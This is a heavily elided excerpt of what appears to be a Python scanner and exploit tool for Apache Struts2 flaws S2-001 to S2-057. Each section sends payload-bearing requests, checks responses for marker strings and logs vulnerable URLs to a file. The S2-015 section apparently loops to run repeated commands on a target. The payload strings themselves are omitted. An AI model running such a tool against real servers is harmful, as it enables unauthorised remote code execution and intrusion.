...
#s2-001
    try:
        ...
        res=requests.get(url1,data,timeout=5)
        #print(res.text)
...
#s2-005
    try:
        ...
        html1 = requests.post(url1 + exec_payload1,timeout=5)
        html2 = requests.post(url1 + exec_payload2,timeout=5)
        # print(html2.content)
...
#s2-007
    try:
        ...
        data={'age':b}
        res=requests.post(url1,data=data,timeout=5)
        if b'367568' in res.content and b'echo' not in res.content:
            print("----------存在S2-007----------")
            if x==0:
                with open('./漏洞url.txt','a') as f:
...
#s2-008
    try:
        ...
        res=requests.get(url1+url2,timeout=5)
        #print(res.content)
        if b'367568' in res.content and b'echo' not in res.content:
            print("----------存在S2-008----------")
            if x==0:
...
#s2-009
    try:
        ...
        res=requests.post(url1+a,timeout=5)
        #print(res.text)
        if b'367568' in res.content and b'echo' not in res.content:
            print("----------存在S2-009----------")
            if x==0:
...
#s2-015
    try:
        ...
        res1=requests.get(h+m,timeout=5)
        res2 = requests.get(url1 + n, timeout=5)
        #print(res1.text)
        if b'367568' in res1.content and b'echo' not in res1.content:
                ...
                while x:
                    ...
                    res = requests.get(h + a, timeout=5)
                    #print(res.text)
            ...
            if '367568' in res2.headers['fxxk']:
                ...
                while x:
                    ...
                    res = requests.get(url1 + a, timeout=5)
...
#s2-045
    try:
        ...
        res=requests.post(url1,headers=headers,timeout=5)
...
#s2-052
    try:
        ...
        #print(payload)
        res=requests.post(url1,data=payload,headers=headers,timeout=5)
        res1=requests.post(url1,headers=headers,timeout=5)
...
#s2-053
    try:
        ...
        res=requests.post(url1,data=data,headers=headers,timeout=5)
        if b'54289' in res.content:
            print('--------存在s2-053--------')
            if x==0:
                with open('./漏洞url.txt','a') as f:
...
#s2-057
    try:
        ...
        res=requests.get(tturl,timeout=5)
        if b'367568' in res.content and b'echo' not in res.content:
            print("----------存在S2-057----------")
            if x==0:
                with open('./漏洞url.txt','a') as f:
